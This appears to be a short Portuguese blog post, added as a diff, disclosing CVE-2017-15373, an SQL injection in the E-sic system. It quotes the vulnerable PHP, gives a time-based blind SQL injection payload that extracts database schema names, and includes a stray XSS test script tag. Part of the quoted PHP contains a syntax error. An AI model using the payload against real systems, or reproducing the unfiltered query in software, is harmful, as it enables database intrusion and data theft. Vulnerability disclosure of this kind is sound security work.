@@ -1,0 +1,41 @@
+---
+title: "E-sic SQL Injection CVE-2017-15373"
+layout: post
+date: 2017-11-26
+categories: cve
+---
+
+Analisando um pedaço do código, observei uma parte sem restrição de acesso nenhum e sem filtro nenhum para as entradas do usuário.
+
+{% highlight php %}
+<?php
+$q = $_REQUEST['q'];
+$sql = "select cep, logradouro, bairro, cidade as municipio, uf as estado
+		from vw_cep
+		where cep like '$q%'
+		and cidade = 'Natal'
+		and uf = 'RN'
+		limit 0,10";
+$resultado = execQuery($sql);
+$codigos = "";
+while($row = mysql_fetch_array($resultado)){
+	$codigos = '"'.$row['cep'].'",';
+	$nomes = .= '"'.htmlentities($row['logradouro']).' . '.htmlentities($row['bairro']).', '.htmlentities($row['municipio']).'/'.$row['estado'].'",';
+}
+$codigos = substr($codigos,0,strlen($codigos)-1);
+$nomes = substr($nomes,0,strlen($nomes)-1);
+?>
+showQueryDiv("<?php echo $q;?>", new Array(<?php echo $codigos;?>), new Array(<?php echo $nomes;?>))
+{% endhighlight %}
+
+Como é possível ver, a variavel $q está recebendo um “$_REQUEST[‘q’]” e está passando para dentro de uma query sql sem nenhum tipo de verificação prévia.
+
+Isso é um blind sql injection, então, você poderá perder bastante tempo com isso, o payload usado foi o seguinte:
+<script>alert(1)</script>
+{% highlight php %}
+1′ AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(HEX(IFNULL(CAST(schema_name AS CHAR),0x20))) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 13,1),11,1))>1,0,5)))))oslN)– UACx
+{% endhighlight %}
+
+
+link <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15373" target="_blank">cve-2017-15373</a>
+
